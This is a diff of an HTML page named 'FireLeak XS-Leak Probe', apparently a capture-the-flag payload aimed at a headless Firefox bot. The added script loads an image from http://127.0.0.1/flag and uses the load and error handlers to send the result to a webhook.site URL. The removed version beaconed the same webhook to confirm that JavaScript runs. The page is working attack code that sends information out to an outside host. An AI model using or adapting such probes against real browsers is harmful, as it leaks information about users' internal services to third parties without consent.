@@ -1,13 +1,26 @@
 <!doctype html>
 <html>
 <body>
-<h1>FireLeak Test</h1>
+<h1>FireLeak XS-Leak Probe</h1>
 
 <script>
-(async () => {
-  // Prove JS is executed inside the headless Firefox bot
-  await fetch("https://webhook.site/5dc1560a-274c-4539-af81-568512041310?status=js_running");
-})();
+
+function leakViaImage() {
+  const img = new Image();
+
+  img.onload = () => {
+    fetch("https://webhook.site/5dc1560a-274c-4539-af81-568512041310?img=loaded");
+  };
+
+  img.onerror = () => {
+    fetch("https://webhook.site/5dc1560a-274c-4539-af81-568512041310?img=error");
+  };
+
+  img.src = "http://127.0.0.1/flag";
+}
+
+leakViaImage();
+
 </script>
 
 </body>
